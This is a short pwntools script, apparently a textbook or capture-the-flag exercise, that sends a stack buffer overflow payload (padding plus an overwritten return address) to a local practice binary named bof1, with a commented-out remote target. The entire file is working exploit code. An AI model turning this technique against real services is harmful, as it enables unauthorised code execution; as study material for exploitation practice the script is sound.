from pwn import *
# p.243 reference

p = process("./bof1")
# p = remote("192.xx.xx.xx", 8888)

print(p.recv(1024))
# gdb.attach(p)
# pause()

# p.send(b"AAAA")
# addr = "\x28\x4c\x04\x08"
# addr = p64(0x0844c28)
# pause()
# # addr = p64(0x0844c28) or p32(0x0844c28)


payload = b''
payload += b"A" * 0x208
payload += p64(0x4011dd)

p.send(payload)
print(p.recv(1024))
